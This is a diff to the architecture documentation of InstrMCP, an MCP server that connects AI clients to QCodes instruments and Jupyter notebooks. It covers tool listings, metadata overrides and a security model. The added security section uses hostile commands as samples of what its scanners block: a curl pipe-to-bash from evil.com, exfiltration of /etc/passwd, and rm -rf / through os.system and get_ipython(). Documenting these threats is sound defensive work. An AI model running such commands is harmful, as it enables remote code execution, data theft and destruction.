@@ -8,19 +8,22 @@ This document describes the technical architecture of InstrMCP, including packag
 instrmcp/
 ├── servers/           # MCP server implementations
 │   ├── jupyter_qcodes/ # Jupyter integration with QCodes instrument access
-│   │   ├── mcp_server.py      # FastMCP server implementation (870 lines)
-│   │   ├── tools.py           # QCodes read-only tools and Jupyter integration (35KB)
-│   │   ├── tools_unsafe.py    # Unsafe mode tools with registrar pattern (130 lines)
-│   │   └── cache.py           # Caching and rate limiting for QCodes parameter reads
+│   │   ├── mcp_server.py      # FastMCP server implementation
+│   │   ├── tools.py           # QCodes read-only tools and Jupyter integration
+│   │   ├── tools_unsafe.py    # Unsafe mode tools with registrar pattern
+│   │   ├── cache.py           # Caching and rate limiting for QCodes parameter reads
+│   │   ├── core/              # Core tool registrars (qcodes, notebook, resources)
+│   │   ├── options/           # Optional features (measureit, database, dynamic_tool)
+│   │   └── security/          # Security scanners and consent management
 │   └── qcodes/        # Standalone QCodes station server
 ├── extensions/        # Jupyter/IPython extensions
-│   ├── jupyterlab/    # JupyterLab extension for active cell bridging
-│   ├── database/      # Database integration tools and resources
-│   └── MeasureIt/     # MeasureIt template resources
-├── tools/             # Helper utilities
-│   └── stdio_proxy.py # STDIO↔HTTP proxy for Claude Desktop/Codex integration
-├── config/            # Configuration management
-│   └── data/          # YAML station configuration files
+│   └── jupyterlab/    # JupyterLab extension for active cell bridging
+├── utils/             # Utility modules
+│   ├── stdio_proxy.py # STDIO↔HTTP proxy for Claude Desktop/Codex integration
+│   ├── metadata_config.py  # Metadata configuration loader
+│   └── logging_config.py   # Logging configuration
+├── config/            # Configuration files
+│   └── metadata_baseline.yaml  # Default tool/resource descriptions (single source of truth)
 └── cli.py             # Main command-line interface
 ```
 
@@ -70,22 +73,22 @@ All tools now use hierarchical naming with `/` separator for better organization
 
 ### QCodes Instrument Tools (`qcodes/*`)
 
-- `qcodes/instrument_info(name, with_values)` - Get instrument details and parameter values
-- `qcodes/get_parameter_values(queries)` - Read parameter values (supports both single and batch queries)
+- `qcodes/instrument_info(name, with_values, detailed)` - Get instrument details; values included when `with_values=true`. Note: IDN parameter is filtered out from display.
+- `qcodes/get_parameter_info(instrument, parameter, detailed)` - Get metadata for a specific parameter (name, label, unit, vals/limits, gettable/settable; with detailed=True also includes scale, offset, cache)
+- `qcodes/get_parameter_values(queries, detailed)` - Read parameter values (supports both single and batch queries)
 
 ### Jupyter Notebook Tools (`notebook/*`)
 
 - `notebook/list_variables(type_filter)` - List notebook variables by type
-- `notebook/get_variable_info(name)` - Detailed variable information
-- `notebook/get_editing_cell(fresh_ms)` - Current JupyterLab cell content
-- `notebook/get_editing_cell_output()` - Get output of most recently executed cell
-- `notebook/get_notebook_cells(num_cells, include_output)` - Get recent notebook cells
+- `notebook/read_variable(name)` - Detailed variable information
+- `notebook/read_active_cell(fresh_ms)` - Current JupyterLab cell content
+- `notebook/read_active_cell_output()` - Get output of the currently active cell
+- `notebook/read_content(num_cells, include_output)` - Get cells around cursor position
 - `notebook/server_status()` - Check server mode and status
 
 ### Unsafe Notebook Tools (`notebook/*` - unsafe mode only)
 
-- `notebook/update_editing_cell(content)` - Update current cell content (requires consent)
-- `notebook/execute_cell(timeout)` - Execute current cell and return output (requires consent)
+- `notebook/execute_active_cell(timeout)` - Execute current cell and return output (requires consent)
 - `notebook/add_cell(cell_type, position, content)` - Add new cell relative to active cell
 - `notebook/delete_cell()` - Delete the currently active cell (requires consent)
 - `notebook/delete_cells(cell_numbers)` - Delete multiple cells by number (requires consent)
@@ -93,24 +96,29 @@ All tools now use hierarchical naming with `/` separator for better organization
 
 ### MeasureIt Integration Tools (`measureit/*` - requires `%mcp_option measureit`)
 
-- `measureit/get_status()` - Check if any MeasureIt sweep is currently running
-- `measureit/wait_for_sweep(variable_name)` - Wait for the given sweep to finish
-- `measureit/wait_for_all_sweeps()` - Wait for all currently running sweeps to finish
+- `measureit/get_status(detailed)` - Check if any MeasureIt sweep is currently running
+- `measureit/wait_for_sweep(variable_name, timeout, all, kill, detailed)` - Wait for sweep(s) to finish. When `kill=true` (default), automatically kills sweep to release resources after completion.
+- `measureit/kill_sweep(variable_name, all)` - Kill sweep(s) to release resources. When `all=true`, kills all sweeps.
 
 ### Database Integration Tools (`database/*` - requires `%mcp_option database`)
 
-- `database/list_experiments(database_path)` - List all experiments in the specified QCodes database
-- `database/get_dataset_info(id, database_path)` - Get detailed information about a specific dataset
+- `database/list_experiments(database_path, scan_nested)` - List all experiments in the specified QCodes database
+- `database/get_dataset_info(id, database_path, code_suggestion)` - Get detailed information about a specific dataset. If `code_suggestion=True`, generates sweep-type-aware Python code for loading the data.
 - `database/get_database_stats(database_path)` - Get database statistics and health information
+- `database/list_available(detailed)` - List all available QCodes databases across common locations
 
-**Note**: All database tools accept an optional `database_path` parameter. If not provided, they default to `$MeasureItHome/Databases/Example_database.db` when MeasureIt is available, otherwise use QCodes configuration.
+**Note**: All database tools accept an optional `database_path` parameter. If not provided, they default to `$MeasureItHome/Databases/Example_database.db` when MeasureIt is available, otherwise use QCodes configuration. `database_list_experiments` also accepts `scan_nested` to search nested `Databases` subdirectories under the MeasureIt data dir.
+
+**Code Suggestion**: When `code_suggestion=True`, the `get_dataset_info` tool automatically detects MeasureIt sweep types (Sweep0D, Sweep1D, Sweep2D, SimulSweep) from metadata and generates appropriate loading code:
+- **Sweep2D parent groups**: Multiple Sweep2D runs in the same experiment are grouped together with code to load and stack all 2D data
+- **SweepQueue batches**: Consecutive runs launched by SweepQueue are grouped with batch loading code
+- **Single sweeps**: Individual measurements get type-specific code (time-based for Sweep0D, 1D arrays for Sweep1D, etc.)
 
 ## MCP Resources Available
 
 ### QCodes Resources
 
-- `available_instruments` - JSON list of available QCodes instruments with hierarchical parameter structure
-- `station_state` - Current QCodes station snapshot without parameter values
+None. Use `qcodes_instrument_info("*")` to list instruments, then `qcodes_instrument_info(name)` for details.
 
 ### Jupyter Resources
 
@@ -128,8 +136,7 @@ All tools now use hierarchical naming with `/` separator for better organization
 
 ### Database Resources (Optional - requires `%mcp_option database`)
 
-- `database_config` - Current QCodes database configuration, path, and connection status
-- `recent_measurements` - Metadata for recent measurements across all experiments
+None. Use `database_list_experiments` and `database_get_dataset_info` for database metadata.
 
 ## Optional Features and Magic Commands
 
@@ -151,16 +158,15 @@ The server supports optional features that can be enabled/disabled via magic com
 
 Only available when `%mcp_unsafe` or `%mcp_dangerous` is active (requires consent in unsafe mode, auto-approved in dangerous mode):
 
-- `notebook/execute_cell(timeout)` - Execute code in the active cell and return output
-  - `timeout`: Max seconds to wait for completion (default: 30.0)
-  - Returns: success, status ("completed"/"error"/"timeout"), execution_count, input, outputs, output, has_output, has_error, error
+- `notebook/execute_active_cell(timeout)` - Execute code in the active cell and return output
+  - `timeout`: Max seconds to wait for completion (default: 30.0). If 0, fire-and-forget.
+  - Returns: status ("completed"/"error"/"timeout"/"no_wait"), executed (true/false/"unknown"), input, outputs, has_output, has_error, error
 - `notebook/add_cell(cell_type, position, content)` - Add new cells to the notebook
   - `cell_type`: "code", "markdown", or "raw" (default: "code")
   - `position`: "above" or "below" active cell (default: "below")
   - `content`: Initial cell content (default: empty)
 - `notebook/delete_cell()` - Delete the active cell (clears content if last cell)
 - `notebook/apply_patch(old_text, new_text)` - Replace text in active cell
-  - More efficient than `notebook_update_editing_cell` for small changes
   - Replaces first occurrence of `old_text` with `new_text`
 
 ### Optional Features
@@ -203,15 +209,16 @@ All MCP tools include annotations per the [MCP specification (2025-06-18)](https
 ### Tool Classification
 
 **Read-Only Tools** (`readOnlyHint: true`):
-- All QCodes tools (`qcodes_instrument_info`, `qcodes_get_parameter_values`)
-- All notebook read tools (`notebook_list_variables`, `notebook_get_*`)
+- All QCodes tools (`qcodes_instrument_info`, `qcodes_get_parameter_info`, `qcodes_get_parameter_values`)
+- All notebook read tools (`notebook_list_variables`, `notebook_read_*`, `notebook_server_status`)
 - All MeasureIt status tools, Database tools, Dynamic list/inspect/stats tools
 - Resource tools (`mcp_list_resources`, `mcp_get_resource`)
 
 **Write Tools - Non-Destructive** (`readOnlyHint: false`, `destructiveHint: false`):
-- `notebook_move_cursor`, `notebook_update_editing_cell`, `notebook_apply_patch`
-- `notebook_execute_cell` (also `openWorldHint: true` - executes code)
+- `notebook_move_cursor`, `notebook_apply_patch`
+- `notebook_execute_active_cell` (also `openWorldHint: true` - executes code)
 - `notebook_add_cell`
+- `measureit_kill_sweep` (stops running sweep, releases resources)
 - `dynamic_register_tool`, `dynamic_update_tool`
 
 **Destructive Tools** (`readOnlyHint: false`, `destructiveHint: true`):
@@ -227,30 +234,154 @@ All MCP tools include annotations per the [MCP specification (2025-06-18)](https
 
 ## Configuration
 
-### Station Configuration
-
-Station configuration uses standard YAML format:
-
-```yaml
-# instrmcp/config/data/default_station.yaml
-instruments:
-  mock_dac:
-    driver: qcodes.instrument_drivers.mock.MockDAC
-    name: mock_dac_1
-    enable: true
-```
-
 ### Environment Variables
 
-- `instrMCP_PATH`: Must be set to the instrMCP installation directory
+- `instrMCP_PATH`: Optional path override for instrMCP installation
 - `JUPYTER_MCP_HOST`: MCP server host (default: 127.0.0.1)
 - `JUPYTER_MCP_PORT`: MCP server port (default: 8123)
 
-### Configuration Files
+### Configuration
 
-- System config: `instrmcp/config/data/`
-- User config: `~/.instrmcp/config.yaml` (optional)
-- Auto-detection via: `instrmcp config`
+View configuration via: `instrmcp config`
+
+## Metadata Configuration
+
+InstrMCP uses a two-layer metadata system for tool and resource descriptions exposed to AI models:
+
+1. **Baseline** (`instrmcp/config/metadata_baseline.yaml`) - Default descriptions bundled with the package
+2. **User Overrides** (`~/.instrmcp/metadata.yaml`) - Optional customizations that override the baseline
+
+Final metadata = Baseline merged with User overrides
+
+### Architecture
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│                    Metadata Loading                          │
+├─────────────────────────────────────────────────────────────┤
+│  1. Load baseline from instrmcp/config/metadata_baseline.yaml│
+│  2. Load user overrides from ~/.instrmcp/metadata.yaml       │
+│  3. Merge: user overrides take precedence                    │
+│  4. Apply to tools via FastMCP transformation API            │
+│  5. Apply to resources via FunctionResource attributes       │
+└─────────────────────────────────────────────────────────────┘
+```
+
+### Baseline Configuration
+
+The baseline file (`instrmcp/config/metadata_baseline.yaml`) contains all default tool and resource descriptions. This is the **single source of truth** for metadata - no descriptions are hardcoded in Python source files.
+
+**Location**: `instrmcp/config/metadata_baseline.yaml` (bundled with package)
+
+### User Override Configuration
+
+Users can customize metadata by creating an override file:
+
+**Location**: `~/.instrmcp/metadata.yaml`
+
+```yaml
+version: 1
+strict: true  # false = warn on unknown tools/resources instead of error
+
+tools:
+  qcodes_instrument_info:
+    title: "Get Instrument Info"
+    description: "Custom description for your lab setup."
+    arguments:
+      name:
+        description: "Instrument name or '*' for all."
+
+resource_templates:
+  resource://measureit_sweep1d_template:
+    description: "Custom Sweep1D description."
+```
+
+### Resource Description Composition
+
+For resources, the final description sent to the model is composed as:
+```
+{description}
+
+When to use: {use_when}
+Example: {example}
+```
+
+### CLI Commands
+
+Manage metadata configuration via the CLI:
+
+| Command | Description |
+|---------|-------------|
+| `instrmcp metadata init` | Create default config with examples |
+| `instrmcp metadata edit` | Open config in `$EDITOR` |
+| `instrmcp metadata list` | Show all configured overrides |
+| `instrmcp metadata show <name>` | Show specific tool/resource override |
+| `instrmcp metadata path` | Show config file path |
+| `instrmcp metadata validate` | Validate config against running server (via STDIO proxy) |
+
+#### Validation via STDIO Proxy
+
+The `validate` command tests the full communication path used by Claude Desktop/Codex:
+
+```
+CLI → STDIO → stdio_proxy → HTTP → MCP Server (8123)
+```
+
+This ensures that:
+1. Your metadata config file is valid YAML with correct schema
+2. All tools/resources referenced in your config exist on the running server
+3. All argument names referenced in tool overrides are valid
+4. The STDIO proxy correctly forwards metadata to MCP clients
+
+Example usage:
+```bash
+# Start the MCP server first (in JupyterLab: %mcp_start)
+instrmcp metadata validate
+
+# With custom timeout
+instrmcp metadata validate --timeout 30
+
+# With explicit launcher path
+instrmcp metadata validate --launcher-path /path/to/claude_launcher.py
+```
+
+### Validation Modes
+
+- **Strict mode** (`strict: true`): Errors on unknown tools/resources - catches typos
+- **Non-strict mode** (`strict: false`): Warnings only - useful for dynamic tools
+
+### Security Features
+
+- YAML loaded with `yaml.safe_load()` to prevent code execution attacks
+- Config file created with `0o600` permissions (user read/write only)
+- Pydantic validation provides clear error messages for invalid config
+- Trailing whitespace automatically stripped from descriptions
+
+### How Overrides Are Applied
+
+1. Server loads baseline config from package (`instrmcp/config/metadata_baseline.yaml`)
+2. Server loads user overrides from `~/.instrmcp/metadata.yaml` (if exists)
+3. Configs are merged (user overrides take precedence for individual fields)
+4. Tool metadata applied via FastMCP's `add_tool_transformation()` API
+5. Resource metadata applied via direct `FunctionResource` attribute modification
+6. Changes take effect immediately for that server session
+
+**Note:** Server restart is required after modifying the user config file.
+
+### E2E Testing
+
+The metadata e2e test (`tests/playwright/run_metadata_e2e.py`) automatically detects user config:
+
+- **No user config**: Uses `metadata_snapshot.json` (baseline reference)
+- **With user config**: Uses `metadata_snapshot_user.json` (user-specific reference)
+
+```bash
+# Verify metadata matches baseline
+python tests/playwright/run_metadata_e2e.py --mode verify
+
+# Create/update snapshot (auto-selects based on user config presence)
+python tests/playwright/run_metadata_e2e.py --mode snapshot
+```
 
 ## Integration Patterns
 
@@ -367,3 +498,102 @@ debug_enabled: true
 **Cause**: `tool_logging` disabled or logger not initialized.
 
 **Solution**: Ensure `~/.instrmcp/logging.yaml` has `tool_logging: true` (default) and restart the kernel.
+
+## Security Architecture
+
+The MCP server implements a multi-layer security model to prevent dangerous code execution and system compromise.
+
+### Security Layers
+
+```
+Code Input → IPython Scanner → AST Scanner → Consent Manager → Execution
+                  ↓                ↓              ↓
+              BLOCKED         BLOCKED        DECLINED
+```
+
+#### Layer 1: IPython Scanner (Pre-AST)
+
+Catches shell injection attacks that bypass Python parsing:
+
+| Pattern | Risk Level | Example |
+|---------|------------|---------|
+| Cell magics | CRITICAL | `%%bash`, `%%sh`, `%%script` |
+| Shell escapes | CRITICAL/HIGH | `!source ~/.zshrc`, `!curl \| bash` |
+| Config file sourcing | CRITICAL | `source ~/.bashrc`, `source ~/conda.sh` |
+| get_ipython() bypass | CRITICAL | `get_ipython().system("...")` |
+| Data exfiltration | CRITICAL | `!curl -d @/etc/passwd` |
+
+**Why this matters**: IPython cell magics like `%%bash` are processed before Python parsing, making them invisible to AST-based scanners. An attacker could inject:
+```python
+%%bash
+source ~/.zshrc  # Executes arbitrary code from shell config
+```
+
+#### Layer 2: AST Scanner
+
+Detects dangerous Python patterns using Abstract Syntax Tree analysis:
+
+| Category | Patterns Detected |
+|----------|-------------------|
+| Code Execution | `eval()`, `exec()`, `compile()` |
+| Builtins Access | `getattr(__builtins__, "eval")`, `globals()["exec"]` |
+| Environment Modification | `os.environ[...] = ...`, `os.putenv()` |
+| Process Execution | `os.system()`, `subprocess.run(shell=True)` |
+| File Operations | `shutil.rmtree()`, writes to `/etc/`, `~/.ssh/` |
+| Persistence | `crontab`, `systemctl`, `launchctl` |
+| Deserialization | `pickle.load()`, `yaml.load()` without Loader |
+
+**Alias-aware**: Catches obfuscated patterns like:
+```python
+from os import system as s
+s("rm -rf /")  # Detected!
+```
+
+#### Layer 3: Consent Manager
+
+For unsafe mode operations, user consent is required before execution:
+
+- `notebook_execute_active_cell` - Code execution
+- `notebook_delete_cell` - Cell deletion
+- `notebook_apply_patch` - Text replacement
+
+**Dangerous mode** (`%mcp_dangerous`) auto-approves all consent dialogs.
+
+### Security Components
+
+Located in `instrmcp/servers/jupyter_qcodes/security/`:
+
+| File | Purpose |
+|------|---------|
+| `ipython_scanner.py` | Pre-AST detection of IPython magics and shell escapes |
+| `code_scanner.py` | AST-based Python pattern detection |
+| `consent.py` | User consent management for unsafe operations |
+| `audit.py` | Security audit logging |
+
+### Attack Vectors Blocked
+
+1. **Shell injection via cell magic**
+   ```python
+   %%bash
+   source ~/.zshrc  # BLOCKED by IPython Scanner
+   ```
+
+2. **Environment variable modification**
+   ```python
+   os.environ["PATH"] = "/evil"  # BLOCKED by AST Scanner
+   ```
+
+3. **Remote code execution**
+   ```python
+   !curl https://evil.com/script.sh | bash  # BLOCKED by IPython Scanner
+   ```
+
+4. **Obfuscated eval**
+   ```python
+   getattr(__builtins__, "eval")("malicious")  # BLOCKED by AST Scanner
+   ```
+
+5. **get_ipython() bypass**
+   ```python
+   get_ipython().system("rm -rf /")  # BLOCKED by IPython Scanner
+   ```
